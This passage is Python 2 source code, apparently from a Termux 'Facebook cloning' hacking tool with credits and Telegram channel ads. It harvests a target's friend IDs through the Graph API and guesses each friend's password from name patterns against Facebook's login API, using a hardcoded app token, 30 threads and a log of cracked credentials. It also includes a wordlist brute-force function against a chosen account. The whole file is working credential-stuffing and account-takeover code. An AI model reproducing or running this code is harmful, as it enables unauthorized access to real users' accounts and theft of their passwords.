										                           pass8 = (b['first_name']+'jahan')											

			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                                                   q = json.load(data)												

			                                                                                   if 'access_token' in q:		

										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                   z = json.loads(x.text)

				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											

				                                                                                   oks.append(user+pass8)

                                                                                                           else:

			                                                                                           if 'www.facebook.com' in q["error_msg"]:

				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'

				                                                                                       cek = open("out/super_cp.txt", "a")

				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")

				                                                                                       cek.close()

				                                                                                       cekpoint.append(user+pass8)   	

										                                   else:					

										                                       pass9 = (b['first_name']+'sheikh')					

										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				

										                                       q = json.load(data)				

										                                       if 'access_token' in q:		

		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                               z = json.loads(x.text)

											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			

											                                       oks.append(user+pass9)

                                                                                                                       else:

			                                                                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'

				                                                                                                   cek = open("out/super_cp.txt", "a")

				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")

				                                                                                                   cek.close()

				                                                                                                   cekpoint.append(user+pass9)

																	

															

		except:

			pass

		

	p = ThreadPool(30)

	p.map(main, id)

	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

	print "  \033[1;94m«---•◈•--- By MR NA--•◈•---»" #Dev:Mr_A7A

	print '\033[1;94m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'

	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))

	print """

             

  /$$$$$$  /$$$$$$$  /$$     /$$ /$$$$$$  /$$   /$$

 /$$__  $$| $$__  $$|  $$   /$$//$$__  $$| $$$ | $$

| $$  \ $$| $$  \ $$ \  $$ /$$/| $$  \ $$| $$$$| $$

| $$$$$$$$| $$$$$$$/  \  $$$$/ | $$$$$$$$| $$ $$ $$

| $$__  $$| $$__  $$   \  $$/  | $$__  $$| $$  $$$$

| $$  | $$| $$  \ $$    | $$   | $$  | $$| $$\  $$$

| $$  | $$| $$  | $$    | $$   | $$  | $$| $$ \  $$

|__/  |__/|__/  |__/    |__/   |__/  |__/|__/  \__/

         Checkpoint ID Open After 7 Days

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.

: \033[1;94m .....MR NA....... \033[1;97m :

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 

                

              \033[1;94m +xxxxxxxxxxxx"""

	

	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")

	menu()

     

def super():

	global toket

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mClone Friend List Public ID."

        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;93mTelegram me @Hacker_Afridi."

        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;93mTelegram Chenal @TERMUX_LOVER."

	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"

	pilih_super()

def pilih_super():

	peak = raw_input("\n\033[1;95mChoose an Option>>> \033[1;97m")

	if peak =="":

		print "\x1b[1;94mFill in correctly"

		pilih_super()

	elif peak =="1":

		os.system('clear')

		print logo

		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")

		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

		try:

			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			op = json.loads(jok.text)

			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]

		except KeyError:

			print"\x1b[1;97mID Not Found!"

			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")

			super()

		print"\033[1;94mGetting IDs\033[1;97m..."

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

        elif peak =="2":

	        os.system('xdg-open https://m.me/DR.N00R.AFRIDI')

	        menu()

        elif peak =="3":

	        os.system('xdg-open https://m.me/DR.N00R.AFRIDI')

	        menu()

	elif peak =="0":

		menu()

	else:

		print "\x1b[1;97mFill in correctly"

		pilih_super()

	

	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))

	jalan('\033[1;94mPlease Wait\033[1;94m...')

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

	print "\n\033[1;97m«--•◈••◈•---\x1b[1;94m•◈•Stop Process Press CTRL+Z•◈•\033[1;97m---•◈••◈•-»"

	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	jalan(' \033[1;97m.................\033[1;94mCloning Start..\033[1;97m............ ')

	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	

			

	def main(arg):

		global cekpoint,oks

		user = arg

		try:

			os.mkdir('out')

		except OSError:

			pass #Dev:love_hacker

		try:													

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												

			b = json.loads(a.text)												

			pass1 = b['first_name'] + '123'												

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			q = json.load(data)												

			if 'access_token' in q:

				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				z = json.loads(x.text)

				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											

				oks.append(user+pass1)

                        else:

			        if 'www.facebook.com' in q["error_msg"]:

				    print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'

				    cek = open("out/super_cp.txt", "a")

				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")

				    cek.close()

				    cekpoint.append(user+pass1)

                                else:

				    pass2 = b['last_name'] + '123'										

                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			            q = json.load(data)												

			            if 'access_token' in q:	

				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				            z = json.loads(x.text)

				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											

				            oks.append(user+pass2)

                                    else:

			                   if 'www.facebook.com' in q["error_msg"]:

				               print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'

				               cek = open("out/super_cp.txt", "a")

				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")

				               cek.close()

				               cekpoint.append(user+pass2)								

				           else:											

					       pass3 = (b['first_name']+b['last_name'])								

					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										

					       q = json.load(data)										

					       if 'access_token' in q:	

						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                       z = json.loads(x.text)

						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'								

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									

						       oks.append(user+pass3)

                                               else:

			                               if 'www.facebook.com' in q["error_msg"]:

				                           print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'

				                           cek = open("out/super_cp.txt", "a")

				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")

				                           cek.close()

				                           cekpoint.append(user+pass3)									

					               else:										

						           pass4 = (b['first_name']+'khan')											

			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                   q = json.load(data)												

			                                   if 'access_token' in q:		

						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                   z = json.loads(x.text)

				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											

				                                   oks.append(user+pass4)

                                                           else:

			                                           if 'www.facebook.com' in q["error_msg"]:

				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'

				                                       cek = open("out/super_cp.txt", "a")

				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")

				                                       cek.close()

				                                       cekpoint.append(user+pass4)					

					                           else:									

						                       pass5 = (b['first_name']+'sharma')						

						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								

						                       q = json.load(data)								

						                       if 'access_token' in q:	

						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                               z = json.loads(x.text)

						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'						

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							

						                               oks.append(user+pass5)	

                                                                       else:

			                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'

				                                                   cek = open("out/super_cp.txt", "a")

				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")

				                                                   cek.close()

				                                                   cekpoint.append(user+pass5)					

						                               else:								

							                           pass6 = (b['first_name']+'thakur')										

			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                           q = json.load(data)												

			                                                           if 'access_token' in q:	

								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                           z = json.loads(x.text)

				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											

				                                                           oks.append(user+pass6)

                                                                                   else:

			                                                                   if 'www.facebook.com' in q["error_msg"]:

				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'

				                                                               cek = open("out/super_cp.txt", "a")

				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")

				                                                               cek.close()

				                                                               cekpoint.append(user+pass6)	

						                                           else:							

								                               pass7 = (b['first_name']+'gupta')					

								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						

								                               q = json.load(data)						

								                               if 'access_token' in q:		

				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                       z = json.loads(x.text)

									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					

									                               oks.append(user+pass7)

                                                                                               else:

			                                                                               if 'www.facebook.com' in q["error_msg"]:

				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'

				                                                                           cek = open("out/super_cp.txt", "a")

				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")

				                                                                           cek.close()

				                                                                           cekpoint.append(user+pass7)           					

								                                       else:						

										                           pass8 = (b['first_name']+'singh')											

			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                                                   q = json.load(data)												

			                                                                                   if 'access_token' in q:		

										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                   z = json.loads(x.text)

				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											

				                                                                                   oks.append(user+pass8)

                                                                                                           else:

			                                                                                           if 'www.facebook.com' in q["error_msg"]:

				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'

				                                                                                       cek = open("out/super_cp.txt", "a")

				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")

				                                                                                       cek.close()

				                                                                                       cekpoint.append(user+pass8)   	

										                                   else:					

										                                       pass9 = (b['first_name']+'kumar')					

										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				

										                                       q = json.load(data)				

										                                       if 'access_token' in q:		

		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                               z = json.loads(x.text)

											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			

											                                       oks.append(user+pass9)

                                                                                                                       else:

			                                                                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'

				                                                                                                   cek = open("out/super_cp.txt", "a")

				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")

				                                                                                                   cek.close()

				                                                                                                   cekpoint.append(user+pass9)

																	

															

		except:

			pass

		

	p = ThreadPool(30)

	p.map(main, id)

	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

	print "  \033[1;94m«---•◈•-- By MR A7A--•◈•---»" #Dev:MR A7A

	print '\033[1;94m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'

	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))

	print """

             

╓─╖╓──╖╓─╖╓────╖╓────╖

║░║║░╓╜║░║║░╓──╜║░╓──╜

║░╙╜╓╜░║░║║░╙──╖║░╙──╖

║░╓╖╙╖░║░║╙──╖░║╙──╖░║

║░║║░╙╖║░║╓──╜░║╓──╜░║

╙─╜╙──╜╙─╜╙────╜╙────╜

,¡|i¹i|¡, 　　　　　,¡|i¹i|¡, 　 　　 ,¡|i¹i|¡,　

¹i|¡,¡|i¹　　　　　¹i|¡,¡|i¹　　　　¹i|¡,¡|i¹ 　

　　　,¡|i¹i|¡, 　　 　　,¡|i¹i|¡,　

　　　¹i|¡,¡|i¹　　　 　¹i|¡,¡|i¹　　　

　　　　　 ,¡|i¹i|¡, 　　　

　　　　　 ¹i|¡,¡|i¹　　　

,¡|i¹i|¡, 　　　　,¡|i¹i|¡, 　 　 ,¡|i¹i|¡,　

¹i|¡,¡|i¹ 　　　　¹i|¡,¡|i¹　 　¹i|¡,¡|i¹

 

         Checkpoint ID Open After 7 Days

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.

: \033[1;94m .....MR NA....... \033[1;97m :

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 

                

              \033[1;94m +xxxxxxxxxx"""

	

	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")

	menu()

def brute():

    os.system('clear')

    try:

        toket = open('login.txt', 'r').read()

    except IOError:

        print '\x1b[1;91m[!] Token not found'

        os.system('rm -rf login.txt')

        time.sleep(0.001)

        login()

    else:

        os.system('clear')

        print logo

        print '\033[1;93m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'

        try:

            email = raw_input('\x1b[1;91m[●] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')

            passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type👉lovehacker.txt) \x1b[1;91m: \x1b[1;97m')

            total = open(passw, 'r')

            total = total.readlines()

            print '\033[1;95m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'

            print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email

            print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'

            jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;95mPlease wait \x1b[1;97m...')

            sandi = open(passw, 'r')

            for pw in sandi:

                try:

                    pw = pw.replace('\n', '')

                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)

                    sys.stdout.flush()

                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

                    mpsh = json.loads(data.text)

                    if 'access_token' in mpsh:

                        dapat = open('Brute.txt', 'w')

                        dapat.write(email + ' ● ' + pw + '\n')

                        dapat.close()

                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'

                        print 52 * '\x1b[1;93m\xe2\x95\x90'

                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;91m:\x1b[1;92m ' + email

                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;91m:\x1b[1;91m ' + pw

                        keluar()

                    else:

                        if 'www.facebook.com' in mpsh['error_msg']:

                            ceks = open('Brutecekpoint.txt', 'w')

                            ceks.write(email + ' | ' + pw + '\n')

                            ceks.close()

                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'

                            print  "\033[1;96m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•."

                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'

                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;93m:\x1b[1;92m ' + email

                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mPassword \x1b[1;93m:\x1b[1;91m ' + pw

                            keluar()

